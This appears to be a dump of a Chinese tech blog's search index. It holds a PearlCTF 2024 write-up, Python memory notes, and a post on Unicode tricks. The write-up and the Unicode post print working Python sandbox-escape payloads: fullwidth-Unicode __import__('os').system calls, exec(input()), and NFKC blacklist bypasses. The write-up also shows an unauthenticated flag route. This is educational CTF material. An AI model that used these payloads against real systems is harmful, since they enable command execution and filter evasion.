2024.3.14"},{"body":"","link":"https://jackgdn.github.io/tags/%E6%95%B0%E5%AD%A6/","section":"tags","tags":null,"title":"数学"},{"body":"","link":"https://jackgdn.github.io/categories/%E6%95%B0%E5%AD%A6/","section":"categories","tags":null,"title":"数学"},{"body":"","link":"https://jackgdn.github.io/tags/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0/","section":"tags","tags":null,"title":"线性代数"},{"body":"","link":"https://jackgdn.github.io/tags/forensics/","section":"tags","tags":null,"title":"Forensics"},{"body":"","link":"https://jackgdn.github.io/tags/misc/","section":"tags","tags":null,"title":"MISC"},{"body":"I am so vegetable 我太菜了 :-(\nb4by_jail 一道简单的 Python 沙箱逃逸（指连我都会做），题目附件如下：\n1#!/usr/local/bin/python 2import time 3flag=\u0026#34;pearl{f4k3_fl4g}\u0026#34; 4blacklist=list(\u0026#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ~`![]{},\u0026lt;\u0026gt;/123456789\u0026#34;) 5def banner(): 6 file=open(\u0026#34;txt.txt\u0026#34;,\u0026#34;r\u0026#34;).read() 7 print(file) 8def check_blocklist(string): 9 for i in string: 10 if i in blacklist: 11 return(0) 12 return(1) 13def main(): 14 banner() 15 cmd=input(\u0026#34;\u0026gt;\u0026gt;\u0026gt; \u0026#34;) 16 time.sleep(1) 17 if(check_blocklist(cmd)): 18 try: 19 print(eval(cmd)) 20 except: 21 print(\u0026#34;Sorry no valid output to show.\u0026#34;) 22 else: 23 print(\u0026#34;Your sentence has been increased by 2 years for attempted escape.\u0026#34;) 24 25main() 所有的字母都被屏蔽，部分符号被屏蔽，数字仅 0 可用，因此想到使用 Unicode 特殊字符绕过。把 __import__('os').system('ls') 的全部字母都换成全角字符：\n1\u0026gt;\u0026gt;\u0026gt; __ｉｍｐｏｒｔ__(\u0026#39;ｏｓ\u0026#39;).ｓｙｓｔｅｍ(\u0026#39;ｌｓ\u0026#39;) 2Traceback (most recent call last): 3 File \u0026#34;\u0026lt;stdin\u0026gt;\u0026#34;, line 1, in \u0026lt;module\u0026gt; 4ModuleNotFoundError: No module named \u0026#39;ｏｓ\u0026#39; 根据 web 师傅的经验，在进行 SSTI 注入时，模块名只能使用原字符。同时由于 Linux 操作系统的限制，os.system() 中的指令也只能使用原字符。因此我们使用下面的方法作为修改过的载荷：\n1__ｉｍｐｏｒｔ__(ｃｈｒ(ｌｅｎ(\u0026#39;000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\u0026#39;)) + ｃｈｒ(ｌｅｎ(\u0026#39;0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\u0026#39;))).ｓｙｓｔｅｍ(ｃｈｒ(ｌｅｎ(\u0026#39;000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\u0026#39;)) + ｃｈｒ(ｌｅｎ(\u0026#39;0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\u0026#39;)) + ｃｈｒ(ｌｅｎ(\u0026#39;00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\u0026#39;)) + ｃｈｒ(ｌｅｎ(\u0026#39;00000000000000000000000000000000\u0026#39;)) + ｃｈｒ(ｌｅｎ(\u0026#39;0000000000000000000000000000000000000000000000\u0026#39;)) + ｃｈｒ(ｌｅｎ(\u0026#39;00000000000000000000000000000000000000000000000\u0026#39;)) + ｃｈｒ(ｌｅｎ(\u0026#39;000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\u0026#39;)) + ｃｈｒ(ｌｅｎ(\u0026#39;000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\u0026#39;)) + ｃｈｒ(ｌｅｎ(\u0026#39;00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\u0026#39;))) 其中的 “os” 与 “ls” 都使用 0 的数量表示，最终拼凑出来的是原字符。通过这个载荷可以看到 flag 所在的文件：./run。随后将载荷中的 “ls” 改为 “cat ./run” 得到 flag。修改后的载荷如下：\n1__ｉｍｐｏｒｔ__(ｃｈｒ(ｌｅｎ(\u0026#39;000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\u0026#39;)) + ｃｈｒ(ｌｅｎ(\u0026#39;0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\u0026#39;))).ｓｙｓｔｅｍ(ｃｈｒ(ｌｅｎ(\u0026#39;000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\u0026#39;)) + ｃｈｒ(ｌｅｎ(\u0026#39;0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\u0026#39;)) + ｃｈｒ(ｌｅｎ(\u0026#39;00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\u0026#39;)) + ｃｈｒ(ｌｅｎ(\u0026#39;00000000000000000000000000000000\u0026#39;)) + ｃｈｒ(ｌｅｎ(\u0026#39;0000000000000000000000000000000000000000000000\u0026#39;)) + ｃｈｒ(ｌｅｎ(\u0026#39;00000000000000000000000000000000000000000000000\u0026#39;)) + ｃｈｒ(ｌｅｎ(\u0026#39;000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\u0026#39;)) + ｃｈｒ(ｌｅｎ(\u0026#39;000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\u0026#39;)) + ｃｈｒ(ｌｅｎ(\u0026#39;00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\u0026#39;))) 修改载荷的脚本（用于将字符使用 0 的数量表示）：\n1d = \u0026#34;cat ./run\u0026#34; 2s = \u0026#39;\u0026#39; 3for i in d: 4 s += \u0026#34;ｃｈｒ(ｌｅｎ(\u0026#39;\u0026#34; 5 s += ord(i) * \u0026#39;0\u0026#39; 6 s += \u0026#34;\u0026#39;)) + \u0026#34; 7print(s[:-3]) 8 9# output: ｃｈｒ(ｌｅｎ(\u0026#39;000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\u0026#39;)) + ｃｈｒ(ｌｅｎ(\u0026#39;0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\u0026#39;)) + ｃｈｒ(ｌｅｎ(\u0026#39;00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\u0026#39;)) + ｃｈｒ(ｌｅｎ(\u0026#39;00000000000000000000000000000000\u0026#39;)) + ｃｈｒ(ｌｅｎ(\u0026#39;0000000000000000000000000000000000000000000000\u0026#39;)) + ｃｈｒ(ｌｅｎ(\u0026#39;00000000000000000000000000000000000000000000000\u0026#39;)) + ｃｈｒ(ｌｅｎ(\u0026#39;000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\u0026#39;)) + ｃｈｒ(ｌｅｎ(\u0026#39;000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\u0026#39;)) + ｃｈｒ(ｌｅｎ(\u0026#39;00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\u0026#39;)) 除了这一种方法，还可以使用 ｅｘｅｃ(ｉｎｐｕｔ()) 作为攻击载荷，这样程序就会执行我们在下一行输入的代码而不进行字符检测，因此后面就可以直接输入 __import__('os').system('ls') 以及 __import__('os').system('cat ./run') 得到 flag。\nTooRandom 能解出这道题就是 too random。下面是题目源码：\n1from flask import Flask 2from flask import render_template 3from flask import redirect 4from flask import request 5 6import random 7 8app = Flask(__name__) 9app.secret_key = \u0026#34;secret_key\u0026#34; 10 11seed = random.getrandbits(32) 12random.seed(seed) 13flag_no = None 14 15def generate_user_ids(): 16 global flag_no 17 random_numbers = [] 18 for i in range(1000000): 19 random_number = random.getrandbits(32) 20 random_numbers.append(random_number) 21 flag_no = random_numbers[-1] 22 print(flag_no) 23 st_id = 624 24 end_id = 999999 25 del random_numbers[st_id:end_id] 26 return random_numbers 27 28user_ids = generate_user_ids() 29j = 0 30 31@app.route(\u0026#39;/\u0026#39;) 32def home(): 33 return redirect(\u0026#39;/dashboard\u0026#39;) 34 35@app.route(\u0026#39;/dashboard\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) 36def dashboard(): 37 global j 38 id_no = user_ids[j%624] 39 j += 1 40 if request.method == \u0026#39;POST\u0026#39;: 41 number = int(request.form[\u0026#39;number\u0026#39;]) 42 if number == flag_no: 43 return redirect(\u0026#39;/flagkeeper\u0026#39;) 44 else: 45 return redirect(\u0026#39;/wrongnumber\u0026#39;) 46 return render_template(\u0026#39;dashboard.html\u0026#39;, number=id_no) 47 48@app.route(\u0026#39;/flagkeeper\u0026#39;) 49def flagkeeper_dashboard(): 50 return render_template(\u0026#39;flag_keeper.html\u0026#39;, user_id=flag_no) 51 52@app.route(\u0026#39;/wrongnumber\u0026#39;) 53def wrong_number(): 54 return render_template(\u0026#39;wrong_number.html\u0026#39;) 55 56if __name__ == \u0026#39;__main__\u0026#39;: 57 app.run(debug=False, host=\u0026#34;0.0.0.0\u0026#34;) 题目需要开启实例，进去后会让用户输入一个随机数：\n此页面为 /dashboard。如果随便输入一个数，大概率会错误，然后进入一个错误页面：\n此时页面为 /wrongnumber。根据题目给出代码中的逻辑，如果输入数字错误，则会进入 /wrongnumber，否则进入 /flagkeeper，因此尝试直接进入 /flagkeeper：\n噫！我中了！网页竟然连个保护都没有，应该是非预期解了。\ninput_validator 题目附件是一个 Java 类，反编译得到：\n1// Source code is decompiled from a .class file using FernFlower decompiler. 2import java.util.Scanner; 3 4public class input_validator { 5 private static final int FLAG_LEN = 34; 6 7 public input_validator() { 8 } 9 10 private static boolean validate(String var0, String var1) { 11 int[] var2 = new int[34]; 12 int[] var3 = new int[]{1102, 1067, 1032, 1562, 1612, 1257, 1562, 1067, 1012, 902, 882, 1397, 1472, 1312, 1442, 1582, 1067, 1263, 1363, 1413, 1379, 1311, 1187, 1285, 1217, 1313, 1297, 1431, 1137, 1273, 1161, 1339, 1267, 1427}; 13 14 int var4; 15 for(var4 = 0; var4 \u0026lt; 34; ++var4) { 16 var2[var4] = var0.charAt(var4) ^ var1.charAt(var4); 17 } 18 19 for(var4 = 0; var4 \u0026lt; 34; ++var4) { 20 var2[var4] -= var1.charAt(33 - var4); 21 } 22 23 int[] var6 = new int[34]; 24 25 int var5; 26 for(var5 = 0; var5 \u0026lt; 17; ++var5) { 27 var6[var5] = var2[1 + var5 * 2] * 5; 28 var6[var5 + 17] = var2[var5 * 2] * 2; 29 } 30 31 for(var5 = 0; var5 \u0026lt; 34; ++var5) { 32 var6[var5] += 1337; 33 } 34 35 for(var5 = 0; var5 \u0026lt; 34; ++var5) { 36 if (var6[var5] != var3[var5]) { 37 return false; 38 } 39 } 40 41 return true; 42 } 43 44 public static void main(String[] var0) { 45 Scanner var1 = new Scanner(System.in); 46 String var2 = \u0026#34;oF/M5BK_U\u0026lt;rqxCf8zWCPC(RK,/B\u0026#39;v3uARD\u0026#34;; 47 System.out.print(\u0026#34;Enter input: \u0026#34;); 48 String var3 = var1.nextLine(); 49 if (var3.length() != 34) { 50 System.out.println(\u0026#34;Input length does not match!\u0026#34;); 51 } else { 52 if (validate(new String(var3), var2)) { 53 System.out.println(\u0026#34;Correct\u0026#34;); 54 } else { 55 System.out.println(\u0026#34;Wrong\u0026#34;); 56 } 57 58 } 59 } 60} 解题脚本：\n1c = [1102, 1067, 1032, 1562, 1612, 1257, 1562, 1067, 1012, 902, 882, 1397, 1472, 1312, 1442, 1582, 1067, 1263, 1363, 1413, 1379, 1311, 1187, 1285, 1217, 1313, 1297, 1431, 1137, 1273, 1161, 1339, 1267, 1427] 2key = list(\u0026#34;oF/M5BK_U\u0026lt;rqxCf8zWCPC(RK,/B\u0026#39;v3uARD\u0026#34;) 3 4for i in range(34): 5 key[i] = ord(key[i]) 6 7for i in range(34): 8 c[i] -= 1337 9 10c1 = [\u0026#39;\u0026#39;] * 34 11for i in range(17): 12 c1[i * 2 + 1] = int(c[i] / 5) 13 c1[i * 2] = int(c[i + 17] / 2) 14 15for i in range(34): 16 c1[i] += key[33 - i] 17 18for i in range(34): 19 c1[i] ^= key[i] 20 21for i in range(34): 22 print(chr(c1[i]), end = \u0026#39;\u0026#39;) 23 24# output: pearl{w0w_r3v3r51ng_15_50_Ea5y_!!} Shipwreck 题目附件是一个 .blend Blender 工程文件，需要使用 Blender 打开。\nflag 在船上第二根桅杆顶部的灯泡上，把灯泡隐藏就能看见 flag。\n眼力题。\nExcel Mayhem 题目附件是一个 .xlsx 的 Excel 表格文件，文件中有 40000 个 flag，其中有 39999 个 fake flag 与一个 real flag。\n众所周知，.xlsx 文件本质上是一个压缩文件，我们不妨修改文件后缀名为 .zip 并解压之。原文件中的字符串存储于 flags\\xl\\sharedStrings.xml 中。\n使用下面的脚本检测缺少哪一个 'fake_flag'\n1with open(\u0026#34;sharedStrings.xml\u0026#34;, \u0026#39;r\u0026#39;) as xml: 2 s = xml.read().split(\u0026#39;\u0026lt;/t\u0026gt;\u0026lt;/si\u0026gt;\u0026lt;si\u0026gt;\u0026lt;t\u0026gt;\u0026#39;) 3 4for i in range(2,40001): 5 fake = f\u0026#34;fake_flag{i}\u0026#34; 6 if fake not in s: 7 print(i) 8 break 9 10# output: 1351 第 1351 个 flag 是 real flag。\n其实眼力好的话，有几行宽度不一样，也可以直接看出来。\n","link":"https://jackgdn.github.io/post/pearl2024/","section":"post","tags":["Reverse","Misc","Forensics","WP"],"title":"PearlCTF 2024 WP"},{"body":"本文中交替出现 Python 的编译模式和交互模式代码块，为便于区分，带有 \u0026gt;\u0026gt;\u0026gt; 的 Python 代码块为交互模式，其余 Python 代码块为编译模式。\n可变对象与不可变对象 可变对象 不可变对象 列表、字典、集合 整型、浮点型、布尔型、字符串、元组 简单来说，可变对象就是指在修改数据时，直接修改原来的数据对象；不可变对象则是创建一个新的对象，并且将变量的引用转移到新创建的对象上。\n1dictnry = {\u0026#39;a\u0026#39;: 0, \u0026#39;b\u0026#39;: 1} # 字典对象为可变对象 2print(id(dictnry)) 3dictnry[\u0026#39;a\u0026#39;] = 1 4print(id(dictnry)) 5 6\u0026#39;\u0026#39;\u0026#39; 7output: 81570839226304 91570839226304 10\u0026#39;\u0026#39;\u0026#39; 下面是一个不可变对象的例子：\n1string = \u0026#39;Hello, world?\u0026#39; 2print(id(string)) 3new_string = string.replace(\u0026#39;?\u0026#39;, \u0026#39;!\u0026#39;) # 因为字符串是不可变对象，因此在修改时需要一个新的变量接受修改后的字符串 4print(id(new_string)) 5print(string) 6print(new_string) 7 8\u0026#39;\u0026#39;\u0026#39; 9output: 101668896675760 111668896210864 12Hello, world? 13Hello, world! 14\u0026#39;\u0026#39;\u0026#39; 深拷贝与浅拷贝 浅拷贝：拷贝对象的引用。当原对象的数据改变时，拷贝的对象也会发生改变。 深拷贝：创建一个新的对象并将原数据存入新的对象。原对象数据改变不影响拷贝对象 在 Python 中，使用 copy() 函数实现浅拷贝，使用 copy.deepcopy() 函数实现深拷贝。\n1# 浅拷贝 2\u0026gt;\u0026gt;\u0026gt; a = {\u0026#39;a\u0026#39;: [1, 2]} 3\u0026gt;\u0026gt;\u0026gt; b = a.copy() 4\u0026gt;\u0026gt;\u0026gt; a, b 5({\u0026#39;a\u0026#39;: [1, 2]}, {\u0026#39;a\u0026#39;: [1, 2]}) 6\u0026gt;\u0026gt;\u0026gt; a[\u0026#39;a\u0026#39;].append(3) 7\u0026gt;\u0026gt;\u0026gt; a, b 8({\u0026#39;a\u0026#39;: [1, 2, 3]}, {\u0026#39;a\u0026#39;: [1, 2, 3]}) 9# 在浅拷贝中，只拷贝原对象的引用（地址）而非创建一个新的对象，因此原对象的值改变，拷贝的对象也随之改变。 10 11# 深拷贝 12\u0026gt;\u0026gt;\u0026gt; import copy 13\u0026gt;\u0026gt;\u0026gt; a = {\u0026#39;a\u0026#39;: [1, 2]} 14\u0026gt;\u0026gt;\u0026gt; b = copy.deepcopy(a) 15\u0026gt;\u0026gt;\u0026gt; a, b 16({\u0026#39;a\u0026#39;: [1, 2]}, {\u0026#39;a\u0026#39;: [1, 2]}) 17\u0026gt;\u0026gt;\u0026gt; a[\u0026#39;a\u0026#39;].append(3) 18\u0026gt;\u0026gt;\u0026gt; a, b 19({\u0026#39;a\u0026#39;: [1, 2, 3]}, {\u0026#39;a\u0026#39;: [1, 2]}) 20# 在深拷贝中，拷贝创建了一个新的对象，因此原对象的值发生改变不影响拷贝的对象的值。 打开 Python Shell，尝试以下操作：\n1\u0026gt;\u0026gt;\u0026gt; a = 10 2\u0026gt;\u0026gt;\u0026gt; b = 10 3\u0026gt;\u0026gt;\u0026gt; a is b 4True 5\u0026gt;\u0026gt;\u0026gt; a = -4 6\u0026gt;\u0026gt;\u0026gt; b = -4 7\u0026gt;\u0026gt;\u0026gt; a is b 8True 9\u0026gt;\u0026gt;\u0026gt; a = 1234 10\u0026gt;\u0026gt;\u0026gt; b = 1234 11\u0026gt;\u0026gt;\u0026gt; a is b 12False 13\u0026gt;\u0026gt;\u0026gt; a = \u0026#39;hi!\u0026#39; 14\u0026gt;\u0026gt;\u0026gt; b = \u0026#39;hi!\u0026#39; 15\u0026gt;\u0026gt;\u0026gt; a is b 16False 17\u0026gt;\u0026gt;\u0026gt; a = \u0026#39;hello_world\u0026#39; 18\u0026gt;\u0026gt;\u0026gt; b = \u0026#39;hello_world\u0026#39; 19\u0026gt;\u0026gt;\u0026gt; a is b 20True 注意：Python 中 == 运算符用于判断两个数据在数值上是否相等，而 is 关键字用于判断两个数据的引用是否一致，通俗来说就是地址是否一致。\n1\u0026gt;\u0026gt;\u0026gt; a = 10 2\u0026gt;\u0026gt;\u0026gt; b = 10.0 3\u0026gt;\u0026gt;\u0026gt; a == b 4True 5\u0026gt;\u0026gt;\u0026gt; a is b 6False 小整数池 Python 为了节约运行内存，添加了小整数池机制。Python 会将 -5 到 256 （含 -5 与 256）的数据存储在固定位置，在需要时直接引用，而不是创建一个新的整形对象。因此：\n1\u0026gt;\u0026gt;\u0026gt; a = 10 2\u0026gt;\u0026gt;\u0026gt; b = 10 3\u0026gt;\u0026gt;\u0026gt; id(a) 4140720040721112 5\u0026gt;\u0026gt;\u0026gt; id(b) 6140720040721112 除了整型对象，仅有的两个布尔型对象也有固定的地址，每次引用都是相同的 True（或者 False）。然而，对于超出小整数池的数据，在引用时就会创建出一个新的对象：\n1\u0026gt;\u0026gt;\u0026gt; a = 1234 2\u0026gt;\u0026gt;\u0026gt; b = 1234 3\u0026gt;\u0026gt;\u0026gt; id(a) 42180555911728 5\u0026gt;\u0026gt;\u0026gt; id(b) 62180558782128 当然，上面的操作都在 Python Shell 中完成。如果在 IDLE 中编写好代码再运行，结果也许会有些许不同……\nInterning 对于上面的例子，在 IDLE 中写好代码运行的结果如下：\n1a = 1234 2b = 1234 3print(id(a)) 4print(id(b)) 5print(a is b) 6 7\u0026#39;\u0026#39;\u0026#39; 8output: 92230861897584 102230861897584 11True 12\u0026#39;\u0026#39;\u0026#39; 不难发现，这一次运行程序，两个 1234 的引用一致。这是因为，Python 在创建了一个整型对象 1234 并被变量 a 引用后，变量 b 也需要引用一个整型对象 1234，因此 b 也引用了刚才创建的整型对象。\n不仅仅是整型对象，除元组外的不可变对象在编译模式下都适用 Interning 机制，而仅当元组内的所有元素都为不可变对象时，元组才适用 Interning 机制。\n字符串驻留 上述 Interning 机制是对于编译模式来讲的，而在交互模式中，同样有字符串驻留机制用于节约内存，以下情况会在交互模式中触发：\n字符串的长度为 0 或 1 字符串长度大于 1 且字符串中仅含有字母、数字及下划线 驻留发生在编译时而非运行时 在查找资料时，许多文章都提到由乘法得到的字符串长度小于等于 20 且仅含有字母、数字及下划线时也会触发驻留机制，然而依据我在 Python 3.12 中的尝试：\n1\u0026gt;\u0026gt;\u0026gt; a = \u0026#39;1234567890qwertyuiop_ASDFGHJKL\u0026#39; * 10 2\u0026gt;\u0026gt;\u0026gt; b = \u0026#39;1234567890qwertyuiop_ASDFGHJKL\u0026#39; * 10 3\u0026gt;\u0026gt;\u0026gt; len(a) 4300 5\u0026gt;\u0026gt;\u0026gt; len(b) 6300 7\u0026gt;\u0026gt;\u0026gt; a is b 8True 这一条似乎并不成立。\n这里面最难以理解的应该是第三条，可以用下面的例子解释：\n1\u0026gt;\u0026gt;\u0026gt; a = \u0026#39;Hi_\u0026#39; 2\u0026gt;\u0026gt;\u0026gt; b = \u0026#39;Hi\u0026#39; + \u0026#39;_\u0026#39; 3\u0026gt;\u0026gt;\u0026gt; a is b 4True # 编译时 5\u0026gt;\u0026gt;\u0026gt; a = \u0026#39;Hi_\u0026#39; 6\u0026gt;\u0026gt;\u0026gt; b = \u0026#39;Hi\u0026#39; 7\u0026gt;\u0026gt;\u0026gt; b + \u0026#39;_\u0026#39; is a 8False # 运行时 ","link":"https://jackgdn.github.io/post/python-%E5%86%85%E5%AD%98%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/","section":"post","tags":["Python"],"title":"Python 内存相关学习记录"},{"body":"","link":"https://jackgdn.github.io/tags/unicode/","section":"tags","tags":null,"title":"Unicode"},{"body":"前段时间有一道不是很难的 Python 沙箱逃逸问题，用到了 Unicode 的 NFKC。这一次详细记录一下 Unicode 里有点意思的特性。\nNFKC 利用 NFKC 算是 Python 沙箱逃逸类题目里较为常用的一种方式。在编写攻击载荷时不得不用到某个字符，但是这个字符又被列入了检测的黑名单中，则会利用 Unicode 的 NFKC 标准化，而 Python 恰好也支持 NFKC，这不就巧了嘛！\n简单来说，NFKC 可以让程序更好地理解一些字符，它将那些形状类似但是编码不同的字符归为一组字符。例如说在 Unicode 中合字 ﬃ (U+FB03) 在视觉上等同于 ffi 三个字符拼凑而成，因此需要计算机软件能够识别 ffi 三个字符等同于 ﬃ 合字字符，以便于用户检索。\n因此在 Python 中就会有如下输出：\n1print(\u0026#34;１\u0026#34; == \u0026#34;1\u0026#34;) # U+FF11 2print(int(\u0026#34;１\u0026#34;) == int(\u0026#34;1\u0026#34;)) 3 4# output: 5# 6# False 7# True 在下面两个网站里可以找到取代某个 ASCII 字符的 Unicode 字符：\nGithub - h13t0ry/UnicodeToy: Unicode fuzzer for various purposes\nList of Unicode Characters of Bidirectional Class “European Number”\n看下面一道例题：\n1from secret import flag 2data = input(\u0026#39;\u0026gt; \u0026#39;) 3assert len(data) \u0026lt;= 9 and all(i not in \u0026#39;123456789\u0026#39; for i in data) and int(data) == 123456789 4print(flag) 看上去不是很麻烦。题目会在远程服务器上运行，secret 模块及其中的 flag 常量都存储在远程服务器上。 如果我们输入的 data 能够满足这个 assert 中的条件，flag 就会自己跳出来。\n条件如下：\ndata 的长度小于等于 9\ndata 中不含 “123456789” 中的任意一个字符\ndata 转化为整型后与 123456789 相等\n根据上面提到的内容，我们知道这道题需要利用 NFKC 得到正确的输入，不妨用下述代码遍历：\n1// filename: Exp_123456789 2 3public class Exp_123456789 { 4 public static void main(String[] args) { 5 // superscript numbers 6 System.out.printf(\u0026#34;%c%c%c\u0026#34;, \u0026#39;\\u00B9\u0026#39;, \u0026#39;\\u00B2\u0026#39;, \u0026#39;\\u00B3\u0026#39;); 7 for(char i = \u0026#39;\\u2074\u0026#39;; i \u0026lt;= \u0026#39;\\u2079\u0026#39;; i++) { 8 System.out.print(i); 9 } 10 System.out.print(\u0026#39;\\n\u0026#39;); 11 // subscript numbers 12 for(char i = \u0026#39;\\u2081\u0026#39;; i \u0026lt;= \u0026#39;\\u2089\u0026#39;; i++) { 13 System.out.print(i); 14 } 15 System.out.print(\u0026#39;\\n\u0026#39;); 16 // numbers with full stop 17 for(char i = \u0026#39;\\u2488\u0026#39;; i \u0026lt;= \u0026#39;\\u2490\u0026#39;; i++) { 18 System.out.print(i); 19 } 20 System.out.print(\u0026#39;\\n\u0026#39;); 21 //full width numbers 22 for(char i = \u0026#39;\\uFF11\u0026#39;; i \u0026lt;= \u0026#39;\\uFF19\u0026#39;; i++) { 23 System.out.print(i); 24 } 25 } 26} 27 28/* 29output: 30¹²³⁴⁵⁶⁷⁸⁹ 31₁₂₃₄₅₆₇₈₉ 32⒈⒉⒊⒋⒌⒍⒎⒏⒐ 33１２３４５６７８９ 34*/ 其实这段代码用 Python 实现更为方便，为了锻炼 Java 能力就先这么写了。不过后面判断哪一组数据符合条件，依然要使用 Python：\n1code = \u0026#34;assert len(data) \u0026lt;= 9 and all(i not in \u0026#39;123456789\u0026#39; for i in data) and int(data) == 123456789\u0026#34; 2try: 3 data = \u0026#34;¹²³⁴⁵⁶⁷⁸⁹\u0026#34; # superscript numbers 4 exec(code) 5 print(data) 6except: 7 try: 8 data = \u0026#34;₁₂₃₄₅₆₇₈₉\u0026#34; # subscript numbers 9 exec(code) 10 print(data) 11 except: 12 try: 13 data = \u0026#34;⒈⒉⒊⒋⒌⒍⒎⒏⒐\u0026#34; # numbers with full stop 14 exec(code) 15 print(data) 16 except: 17 data = \u0026#34;１２３４５６７８９\u0026#34; # full width numbers 18 exec(code) 19 print(data) 20 21# output: １２３４５６７８９ 宽字符赢得了比赛！\n零宽字符隐写 前几天想用零宽字符给述职报告凑字数，然后知道了这个东西。不妨先看看零宽字符是什么个东西。通俗来讲，零宽字符就是“宽度为 0 的字符”，一般在从右向左书写的语言以及字与字之间有连笔的语言，如阿拉伯语。下面是一个零宽字符的例子：\n1string = \u0026#34;A\u0026#34; + \u0026#34;\\u200C\\u200C\\u200D\\u200D\u0026#34; + \u0026#34;b\u0026#34; 2print(string) 3print(len(string)) 4 5# output: 6# 7# A‌‌‍‍b 8# 6 在上面的例子中，我们用到了 U+200C 与 U+200D 这两个零宽字符，它们分别是 “断字符” 和 “连字符”，用于控制阿拉伯语的连笔，故在英文语境下不会被打印出来。下面这张表是 Unicode 中全部零宽字符：\n编码 描述 U+200A ZERO WIDTH SPACE U+200B ZERO WIDTH SPACE U+200C ZERO WIDTH NON-JOINER U+200D ZERO WIDTH JOINER U+200E LEFT-TO-RIGHT MARK U+200F LEFT-TO-RIGHT MARK U+202A LEFT-TO-RIGHT EMBEDDING U+202C POP DIRECTIONAL FORMATTING U+202D LEFT-TO-RIGHT OVERRIDE U+2062 INVISIBLE TIMES U+2063 INVISIBLE SEPARATOR U+FEFF ZERO WIDTH NO-BREAK SPACE 如果一段文本中夹杂了零宽字符，一般的文本编辑器无法显示，但是放入 Cyberchef 或者 Vim 中就能看到了。用上面的 \u0026quot;A‌‌‍‍b\u0026quot; 举例子：\n那么什么是零宽字符隐写呢？零宽字符隐写将密文对应的编码转化为不同的零宽字符，并将其混杂在正常的文本中。例如说，我使用 U+200C 与 U+200D 两种零宽字符作为用于加密，我可以令 U+200C 对应二进制 0，U+200D 对应二进制 1。下面这段代码，将 \u0026quot;Meschenrechte\u0026quot; 这个单词隐写入 \u0026quot;Hello, World!\u0026quot; 这句话中：\n1print(\u0026#34;Hello, World\u0026#34;, end = \u0026#39;\u0026#39;) 2secret = \u0026#34;Meschenrechte\u0026#34; 3 4for i in secret: 5 s = str(bin(ord(i)))[2:] 6 print(\u0026#34;\\u200C\u0026#34;, end = \u0026#39;\u0026#39;) 7 for k in s: 8 if k == \u0026#34;0\u0026#34;: 9 print(\u0026#34;\\u200C\u0026#34;, end = \u0026#39;\u0026#39;) 10 else: 11 print(\u0026#34;\\u200D\u0026#34;, end = \u0026#39;\u0026#39;) 12 13print(\u0026#34;!\u0026#34;) 14 15# output: Hello, World‌‍‌‌‍‍‌‍‌‍‍‌‌‍‌‍‌‍‍‍‌‌‍‍‌‍‍‌‌‌‍‍‌‍‍‌‍‌‌‌‌‍‍‌‌‍‌‍‌‍‍‌‍‍‍‌‌‍‍‍‌‌‍‌‌‍‍‌‌‍‌‍‌‍‍‌‌‌‍‍‌‍‍‌‍‌‌‌‌‍‍‍‌‍‌‌‌‍‍‌‌‍‌‍! 在这一样例程序，我们只是把密文转换成 U+200C 与 U+200D 两种零宽字符并全部放入了 'd' 与 '!' 之间的位置。然而在实际操作中，密文可以使用其他几种零宽字符、使用其他编码格式、打乱顺序等等。由此可见，零宽字符隐写并没有一个统一的标准，我可以用任意的符号来代替一种编码，因此实际上零宽字符隐写最大的优势在于它看不见。正是出于这个原因，我认为 2023 安洵杯“疯狂的麦克斯”一题并不严谨。有许多在线工具可以进行零宽字符的加密与解密，安洵杯中使用的是这个：\nUnicode Steganography with Zero-Width Characters\n哦对了，还需要一个解密脚本，对应我自己设计的隐写脚本：\n1text = \u0026#34;Hello, World‌‍‌‌‍‍‌‍‌‍‍‌‌‍‌‍‌‍‍‍‌‌‍‍‌‍‍‌‌‌‍‍‌‍‍‌‍‌‌‌‌‍‍‌‌‍‌‍‌‍‍‌‍‍‍‌‌‍‍‍‌‌‍‌‌‍‍‌‌‍‌‍‌‍‍‌‌‌‍‍‌‍‍‌‍‌‌‌‌‍‍‍‌‍‌‌‌‍‍‌‌‍‌‍!\u0026#34; 2cip = text[12: -1] 3 4for i in range(0, 104, 8): 5 seg = cip[i: i + 8] 6 dat = 0 7 for k in range(0, 8): 8 if seg[k] == \u0026#34;\\u200D\u0026#34;: 9 dat = dat + 2**(7 - k) 10 print(chr(dat), end = \u0026#39;\u0026#39;) 11 12# output: Meschenrechte 试了一下，我自己的隐写脚本得到的结果，拖到那个网站里解密会失败 (っ °Д °;)っ\nUnicode 中的零宽字符早已被人们开发出更多的用途，例如添加文字水印防止剽窃、反爬虫摸出关键字防止屏蔽或者给文章凑字数。\nUnicode 附加字符 这个似乎与 CTF 的关系并不大，但是也挺有意思。演示一下：\ǹ́̂̃̄̅̆̇̈ ̉̊̋̌̍̎̏̐̑ ̖̗̘̙̒̓̔̕̚ 